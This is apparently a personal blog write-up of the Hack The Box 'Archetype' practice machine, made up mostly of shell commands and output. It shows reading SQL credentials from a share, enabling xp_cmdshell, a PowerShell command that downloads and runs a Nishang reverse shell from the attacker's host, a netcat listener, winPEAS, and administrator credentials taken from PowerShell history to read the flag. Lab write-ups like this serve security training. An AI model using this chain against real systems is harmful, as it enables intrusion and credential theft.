---
layout: post
title:  "Archetype"
date:   2022-07-16 10:00:00 +1000
category: hacking
---

Need to make a few notes with this. Firstly, we have MSSql server creds obtained through an unsecured SMB share:

{% highlight shell %}
┌──(root💀kali)-[/opt/htb]
└─# cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
{% endhighlight %}

Now we use Impacket **mssqlclient.py** like [so](https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/):

{% highlight shell %}
┌──(root💀kali)-[/opt/htb]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_svc@10.129.238.160 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.61/Invoke-PowerShellTcp.ps1\")
{% endhighlight %}

The ps1 script was from Nishang:

{% highlight shell %}
┌──(root💀kali)-[/opt/scripts]
└─# git clone https://github.com/samratashok/nishang 
Cloning into 'nishang'...
remote: Enumerating objects: 1699, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 1699 (delta 2), reused 4 (delta 1), pack-reused 1691
Receiving objects: 100% (1699/1699), 10.88 MiB | 9.62 MiB/s, done.
Resolving deltas: 100% (1061/1061), done.
{% endhighlight %}

and

{% highlight shell %}
┌──(root💀kali)-[/opt/htb/starting_point/archetype]
└─# cp /opt/scripts/nishang/Shells/Invoke-PowerShellTcp.ps1 .
┌──(root💀kali)-[/opt/htb/starting_point/archetype]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.238.160 - - [15/Jul/2022 23:04:33] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
{% endhighlight %}

and

{% highlight shell %}
┌──(root💀kali)-[/opt/htb/starting_point/archetype]
└─# nc -nvlp 443  
listening on [any] 443 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.238.160] 49676
Windows PowerShell running as user sql_svc on ARCHETYPE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
{% endhighlight %}

Next, run winPEAS and it does work but displays *nothing* until it's finished:

{% highlight shell %}
PS C:\Temp> Invoke-WebRequest -Uri 'http://10.10.14.61/winPEAS.bat' -OutFile C:\Temp\winpeas.bat
PS C:\Temp> dir

Directory: C:\Temp
Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                  
-a----        7/15/2022   8:09 PM          35946 winpeas.bat                                                       
PS C:\Temp> .\winpeas.bat
{% endhighlight %}

We find some creds:

{% highlight shell %}
PS C:\Temp> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! exit                                                                                                                      PS C:\Temp>
{% endhighlight %}

And need to read our file:

{% highlight shell %}
PS C:\Users\sql_svc\Desktop> $Username = 'Administrator'
PS C:\Users\sql_svc\Desktop> $Password = 'MEGACORP_4dm1n!!'
PS C:\Users\sql_svc\Desktop> $pass = ConvertTo-SecureString -AsPlainText $Password -Force                                                                                                                          
PS C:\Users\sql_svc\Desktop> $Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass 
PS C:\Users\sql_svc\Desktop> Invoke-Command -ComputerName "ARCHETYPE" -Credential $Cred -ScriptBlock {Get-Content C:\Users\Administrator\Desktop\root.txt}
# flag obtained
{% endhighlight %}
